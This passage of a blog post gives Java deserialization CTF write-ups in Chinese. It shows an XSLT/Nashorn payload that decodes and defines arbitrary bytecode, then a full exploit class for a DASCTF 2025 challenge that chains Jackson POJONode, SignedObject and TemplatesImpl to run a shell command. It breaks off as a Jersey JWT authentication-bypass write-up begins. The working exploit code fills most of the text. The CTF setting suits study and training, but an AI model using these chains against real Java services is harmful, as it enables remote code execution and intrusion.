class="hljs-string">&quot;sem:new()&quot;</span>/&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;jsobject&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;sem:getEngineByName($engineobject,&#x27;nashorn&#x27;)&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;out&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;se:e<span class="hljs-symbol">&amp;#x76;</span>al($jsobject,&#x27;var thread = ja<span class="hljs-symbol">&amp;#x76;</span>a.lang.Thread.currentThread();var classLoader = thread.getContextClassLoader();ja<span class="hljs-symbol">&amp;#x76;</span>a.lang.System.out.println(classLoader);try&#123;classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>org.apache.commons.qx.SOAPUtils<span class="hljs-symbol">&amp;quot;</span>).newInstance();&#125;catch (e)&#123;var clsString = classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>ja<span class="hljs-symbol">&amp;#x76;</span>a.lang.String<span class="hljs-symbol">&amp;quot;</span>);var bytecodeBase64 = <span class="hljs-symbol">&amp;quot;</span>&lt;payload&gt;<span class="hljs-symbol">&amp;quot;</span>;var bytecode;try&#123;var clsBase64 = classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>ja<span class="hljs-symbol">&amp;#x76;</span>a.util.Base64<span class="hljs-symbol">&amp;quot;</span>);var clsDecoder = classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>ja<span class="hljs-symbol">&amp;#x76;</span>a.util.Base64$Decoder<span class="hljs-symbol">&amp;quot;</span>);bytecode = ja<span class="hljs-symbol">&amp;#x76;</span>a.util.Base64.getDecoder().decode(bytecodeBase64);&#125; catch (ee) &#123;try &#123;var datatypeCon<span class="hljs-symbol">&amp;#x76;</span>erterClz = classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>ja<span class="hljs-symbol">&amp;#x76;</span>ax.xml.bind.DatatypeCon<span class="hljs-symbol">&amp;#x76;</span>erter<span class="hljs-symbol">&amp;quot;</span>);bytecode = datatypeCon<span class="hljs-symbol">&amp;#x76;</span>erterClz.getMethod(<span class="hljs-symbol">&amp;quot;</span>parseBase64Binary<span class="hljs-symbol">&amp;quot;</span>, clsString).in<span class="hljs-symbol">&amp;#x76;</span>oke(datatypeCon<span class="hljs-symbol">&amp;#x76;</span>erterClz, bytecodeBase64);&#125; catch (eee) &#123;var clazz1 = classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>sun.misc.BASE64Decoder<span class="hljs-symbol">&amp;quot;</span>);bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);&#125;&#125;var clsClassLoader = classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>ja<span class="hljs-symbol">&amp;#x76;</span>a.lang.ClassLoader<span class="hljs-symbol">&amp;quot;</span>);var clsByteArray = (new ja<span class="hljs-symbol">&amp;#x76;</span>a.lang.String(<span class="hljs-symbol">&amp;quot;</span>a<span class="hljs-symbol">&amp;quot;</span>).getBytes().getClass());var clsInt = ja<span class="hljs-symbol">&amp;#x76;</span>a.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(<span class="hljs-symbol">&amp;quot;</span>defineClass<span class="hljs-symbol">&amp;quot;</span>, [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.in<span class="hljs-symbol">&amp;#x76;</span>oke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();&#125;&#x27;)&quot;</span>/&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$out&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520181531620.png" alt="image-20250520181531620"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»å°†æ¶æ„å­—èŠ‚ç å’Œxsltå†™è¿›å»äº†ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520181934973.png" alt="image-20250520181934973"></p><p>è¿œç¨‹æ”¹ä¸ªurlå°±è¡Œäº†ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://github.com/XDSEC/miniLCTF_2025/blob/main/OfficialWriteups/Web/ezHessian-hdHessian.md">miniLCTF_2025&#x2F;OfficialWriteups&#x2F;Web&#x2F;ezHessian-hdHessian.md at main Â· XDSEC&#x2F;miniLCTF_2025</a></p><p><a href="https://flowerwind.github.io/2023/04/17/%E8%AE%B0%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98hessian%E4%B8%8D%E5%87%BA%E7%BD%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-md/">è®°æŸæ¬¡å®æˆ˜hessianä¸å‡ºç½‘ååºåˆ—åŒ–åˆ©ç”¨ | huahuaâ€™s Blog</a></p><p><a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/">Hessian UTF-8 Overlong Encoding - X1r0z Blog</a></p><p><a href="https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html">æ¢å¯»Hessian JDKåŸç”Ÿååºåˆ—åŒ–ä¸å‡ºç½‘çš„ä»»æ„ä»£ç æ‰§è¡Œåˆ©ç”¨é“¾ â€“ Whwlsfbâ€™s Tech Blog</a></p><p><a href="https://www.freebuf.com/articles/web/424308.html">Hessianååºåˆ—åŒ–åŸç†åˆ°æ­¦å™¨åŒ–åˆ©ç”¨ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>[å†…å­˜é©¬ç³»åˆ— Jettyå‹å†…å­˜é©¬å­¦ä¹  - Boogiepop Doesnâ€™t Laugh](<a href="https://boogipop.com/2023/10/01/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97">https://boogipop.com/2023/10/01/å†…å­˜é©¬ç³»åˆ—</a> Jettyå‹å†…å­˜é©¬å­¦ä¹ &#x2F;)</p><p><a href="https://xz.aliyun.com/news/14578">ä»0åˆ°1å­¦ä¼šJettyå†…å­˜é©¬æ³¨å…¥-å…ˆçŸ¥ç¤¾åŒº</a></p><h2 id="DASCTF2025ä¸ŠåŠå¹´-å†çŸ­ä¸€ç‚¹ç‚¹"><a href="#DASCTF2025ä¸ŠåŠå¹´-å†çŸ­ä¸€ç‚¹ç‚¹" class="headerlink" title="DASCTF2025ä¸ŠåŠå¹´-å†çŸ­ä¸€ç‚¹ç‚¹"></a>DASCTF2025ä¸ŠåŠå¹´-å†çŸ­ä¸€ç‚¹ç‚¹</h2><p>åªç»™äº†h2å’Œspringçš„ä¾èµ–ï¼Œååºåˆ—åŒ–æœ‰é•¿åº¦é™åˆ¶ï¼Œå¼€å§‹ä»¥ä¸ºè¿™é‡Œæ˜¯æœ€ç»ˆsinkï¼Œéœ€è¦æ‰¾gadgetè§¦å‘åˆ°getConnection()ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°é¢˜ç›®å°±æ˜¯ç¡¬å‹çš„ã€‚ã€‚ã€‚ã€‚</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250708151505554.png" alt="image-20250708151505554"></p><p>æ€è·¯å°±æ˜¯åˆ©ç”¨Jacksoné“¾çš„ä¸ç¨³å®šæ€§ï¼ˆä¸ä½¿ç”¨åŠ¨æ€ä»£ç†ï¼‰å»å‹ç¼©ï¼Œå¾ªç¯éå†åˆ°ç¬¦åˆé•¿åº¦æ¡ä»¶çš„base64-payloadï¼Œæœ€åpayloadåˆ æ‰ä¸¤ä¸ªå­—ç¬¦ä¸å½±å“æœ€åçš„è·‘é€šã€‚</p><p>resolveClassçš„é»‘åå•banäº†TemplatesImplã€BadAttributeValueExpExceptionè¿™ç§ï¼Œå¯ä»¥ç›´æ¥ç”¨SignedObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–ç»•äº†ã€‚</p><p>è¿˜è¦æ³¨æ„é¢˜ç›®ç”¨çš„ååºåˆ—åŒ–æ˜¯InflaterInputStreamï¼Œæ‰€ä»¥æˆ‘ä»¬åºåˆ—åŒ–ä¹Ÿéœ€è¦ç”¨å¯¹åº”çš„DeflaterOutputStreamè¿›è¡Œå¤„ç†åºåˆ—åŒ–æ•°æ®ã€‚</p><p>é¢˜ç›®æ„æ€å°±æ˜¯åˆ æ‰&#x2F;aæ–‡ä»¶å°±å¯ä»¥å›æ˜¾å‡ºflagäº†ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250708151606781.png" alt="image-20250708151606781"></p><h3 id="EXP-8"><a href="#EXP-8" class="headerlink" title="EXP"></a>EXP</h3><p>æ€è·¯å°±è¿™ä¹ˆä¸ªæ€è·¯ï¼Œç›´æ¥ç”¨å®˜æ–¹çš„äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        overrideJackson();<br>        <span class="hljs-type">byte</span>[] bytes = getshortclass(<span class="hljs-string">&quot;rm /a&quot;</span>);<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;  <span class="hljs-comment">//å¾ªç¯ï¼Œè®©å¤´éƒ¨æœ€å°ï¼Œä¸ºäº†æ‹¿åˆ°æœ€çŸ­çš„payload</span><br>            <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> (TemplatesImpl) getTemplates(bytes);<br><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);   <span class="hljs-comment">//ä¸ºäº†å‹ç¼©é“¾å­é•¿åº¦ï¼Œä¸ä½¿ç”¨åŠ¨æ€ä»£ç†ï¼Œä½†å¯èƒ½ä¼šæ— æ³•è§¦å‘ï¼ˆå°æ¦‚ç‡ï¼‰ã€‚</span><br>            <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> getEventListenerList(pojoNode);<br><br>            <span class="hljs-comment">//äºŒæ¬¡ååºåˆ—åŒ–</span><br>            <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> second_serialize(eventListenerList);<br><br>            <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>            <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList2</span> <span class="hljs-operator">=</span> getEventListenerList(pojoNode2);<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> serialize(eventListenerList2);<br>            System.out.println(a);<br>            System.out.println(a.length());<br>            <span class="hljs-keyword">if</span> (a.length()&lt;=<span class="hljs-number">1284</span>)&#123;<br>                deserialize(a);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SignedObject <span class="hljs-title function_">second_serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException, IOException, SignatureException, InvalidKeyException &#123;<br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>((Serializable) o, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br>        <span class="hljs-keyword">return</span> signedObject;<br>    &#125;<br><br>    <span class="hljs-comment">//ä¸€æ¡JDK toStringé“¾ readObject-&gt;toString</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> EventListenerList <span class="hljs-title function_">getEventListenerList</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br><br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(manager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(obj);<br><br>        setValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, manager&#125;);<br>        <span class="hljs-keyword">return</span> eventListenerList;<br>    &#125;<br><br>    <span class="hljs-comment">//è·å–å·²å®ä¾‹åŒ–ç±»ä¸­çš„å€¼</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">( <span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>            <span class="hljs-keyword">if</span> (field != <span class="hljs-literal">null</span>)<br>                field.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br><br>            <span class="hljs-keyword">return</span> field;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;<br>                <span class="hljs-keyword">return</span> getField(clazz.getSuperclass(), fieldName);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//é‡å†™jackson</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">overrideJackson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getTemplates</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);  <span class="hljs-comment">//è¿™é‡Œä¹Ÿè¦ä¸ºç©º</span><br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-keyword">return</span> templates;<br>    &#125;<br><br>    <span class="hljs-comment">// æä¾›éœ€è¦åºåˆ—åŒ–çš„ç±»ï¼Œè¿”å›base64åçš„å­—èŠ‚ç </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-comment">// ä½¿ç”¨ Deflater è®¾ç½®ä¸ºæœ€é«˜å‹ç¼©ç‡</span><br>        <span class="hljs-type">Deflater</span> <span class="hljs-variable">deflater</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Deflater</span>(Deflater.BEST_COMPRESSION);<br>        <span class="hljs-type">DeflaterOutputStream</span> <span class="hljs-variable">deflaterOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeflaterOutputStream</span>(byteArrayOutputStream, deflater);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(deflaterOutputStream);<br>        objectOutputStream.writeObject(obj);<br><br>        <span class="hljs-comment">// å…³é—­æµ</span><br>        objectOutputStream.flush();<br>        deflaterOutputStream.finish();<br>        deflaterOutputStream.close();<br><br>        <span class="hljs-comment">// è½¬æ¢ä¸º Base64 å­—ç¬¦ä¸²</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());<br>        <span class="hljs-keyword">return</span> poc;<br>    &#125;<br><br>    <span class="hljs-comment">//ä¸€ä¸ªçŸ­çš„å‘½ä»¤æ‰§è¡Œclassï¼Œç”¨javassistå†™çš„</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getshortclass(String cmd) <span class="hljs-keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[] bytes = clazz.toBytecode();<br>        <span class="hljs-keyword">return</span> cleanBytecode(bytes);<br>    &#125;<br><br>    <span class="hljs-comment">//ç”¨ ASM è¿›è¡ŒäºŒæ¬¡æ¸…æ´—å°‘é‡æ— ç”¨æŒ‡ä»¤ã€‚</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] cleanBytecode(<span class="hljs-type">byte</span>[] classBytes) &#123;<br>        <span class="hljs-type">ClassReader</span> <span class="hljs-variable">cr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(classBytes);<br>        <span class="hljs-type">ClassWriter</span> <span class="hljs-variable">cw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(ClassWriter.COMPUTE_FRAMES);<br>        <span class="hljs-type">ClassVisitor</span> <span class="hljs-variable">cv</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassVisitor</span>(Opcodes.ASM9, cw) &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> MethodVisitor <span class="hljs-title function_">visitMethod</span><span class="hljs-params">(<span class="hljs-type">int</span> access, String name, String descriptor, String signature, String[] exceptions)</span> &#123;<br>                <span class="hljs-type">MethodVisitor</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.visitMethod(access, name, descriptor, signature, exceptions);<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodVisitor</span>(Opcodes.ASM9, mv) &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitLineNumber</span><span class="hljs-params">(<span class="hljs-type">int</span> line, Label start)</span> &#123;<br>                        <span class="hljs-comment">// Skip line numbers</span><br>                    &#125;<br>                &#125;;<br>            &#125;<br>        &#125;;<br>        cr.accept(cv, ClassReader.SKIP_FRAMES | ClassReader.SKIP_DEBUG);<br>        <span class="hljs-keyword">return</span> cw.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="DASCTF2025ä¸ŠåŠå¹´-æ³½è¥¿å²›"><a href="#DASCTF2025ä¸ŠåŠå¹´-æ³½è¥¿å²›" class="headerlink" title="DASCTF2025ä¸ŠåŠå¹´-æ³½è¥¿å²›"></a>DASCTF2025ä¸ŠåŠå¹´-æ³½è¥¿å²›</h2><p>jdk17ä¸‹çš„h2ï¼Œå®¡æºç å’Œçœ‹åå­—å°±çŸ¥é“è·Ÿè¿™é‡Œçš„jerseyæ¡†æ¶æœ‰å…³ã€‚</p><p>åœ¨è¿™é‡Œè¿˜å­¦äº†ä¸€æ‰‹waråŒ…çš„debugï¼Œå…¶å®å°±æ˜¯æ”¾tomcaté‡Œç„¶åIDEAç”¨Remoteè¿localhostï¼Œå°±å¯ä»¥ç›´æ¥è°ƒäº†ã€‚</p><p>å¦‚æœç›´æ¥çœ‹æºç ï¼Œjadxæˆ–è€…jd-guiåç¼–è¯‘å°±å¯ä»¥çœ‹åˆ°äº†ã€‚åœ¨WEB-INFç›®å½•ä¸‹å°±æ˜¯æºç ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250806165815746.png" alt="image-20250806165815746"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250806165931650.png" alt="image-20250806165931650"></p><p>å¾ˆæ˜¾ç„¶è¦ç»•ä¸€ä¸ªJWTé‰´æƒï¼Œä½†æ˜¯keyæ˜¯éšæœºå€¼ï¼Œè€Œä¸”å¤ªé•¿æ²¡æ³•çˆ†ç ´ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>çªç ´å£åœ¨äºjerseyçš„ä¸€ä¸ªè·¯ç”±è§£æé€»è¾‘é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒï¼š</p><p><a href="https://forum.butian.net/article/685">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-CVE-2024-56325: Apache Pinot Authentication bypass æ¼æ´åˆ†æ</a></p><p>[Apache Pinot CVE-2024-56325 Authentication Bypass æ¼æ´åˆ†æ | ph0ebusâ€™s Blog](<a href="https://blog.ph0ebus.cn/2025/04/03/Apache">https://blog.ph0ebus.cn/2025/04/03/Apache</a> Pinot CVE-2024-56325 Authentication Bypass æ¼æ´åˆ†æ&#x2F;)</p><p>æˆ‘ä»¬è·Ÿè¿›åˆ°<code>org.glassfish.jersey.server.internal.routing.SingleMatchResult#stripMatrixParams</code>ï¼š</p><p><img 